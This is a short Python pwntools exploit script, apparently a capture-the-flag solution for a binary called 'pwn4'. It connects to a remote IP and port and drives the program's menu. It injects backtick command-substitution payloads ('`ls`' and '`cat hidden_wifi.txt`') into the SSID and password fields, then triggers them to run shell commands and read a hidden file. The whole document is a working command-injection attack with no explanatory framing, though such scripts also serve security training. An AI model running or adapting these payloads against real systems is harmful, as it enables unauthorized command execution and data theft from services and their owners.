#!/usr/bin/env python3
from pwn import *
exe = ELF('pwn4', checksec = False)

# p = process(exe.path)
p = remote('103.197.184.48', 13337)

def add(ssid, password):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'SSID: ', ssid)
    p.sendlineafter(b'Password: ', password)

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'connect: ', idx)
    p.sendlineafter(b'?: ', b'yes')

payload = b'`ls`'
add(payload, payload)
show(b'0')
payload = b'`cat hidden_wifi.txt`'
add(payload, payload)
show(b'1')


p.interactive()